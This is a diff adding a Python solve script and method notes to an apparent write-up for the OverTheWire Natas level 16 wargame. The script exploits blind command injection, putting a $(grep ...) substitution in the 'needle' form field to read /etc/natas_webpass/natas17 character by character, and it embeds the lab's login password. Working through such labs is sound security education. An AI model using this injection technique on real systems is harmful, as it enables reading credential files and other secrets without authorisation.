@@ -18,4 +18,27 @@ It means, the result of grep is printed, the value of needle is changed for univ
 In addition, using grep a^, we can find text only started with a.  
 In this way, we are going to script brute-force file for using this logic.
 
+```python
+import requests
+import string
+
+username='natas16'
+password='hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+url='http://natas16.natas.labs.overthewire.org'
+charset=string.ascii_letters+string.digits
+result=''
+
+for i in range(32):
+    for char in charset:
+        print(f"Current char = {char}")
+        response=requests.post(url,auth=(username,password),
+                               data={"needle":"university$(grep ^"+result+char+".* /etc/natas_webpass/natas17)"})
+        if "university" not in response.text:
+            result+=char
+            print(result)
+            break;
+```
+
 ## Method of solve
+Blind Command Injection using Command Substitution Injection  
+Meaning of ^(Caret symbol) in grep
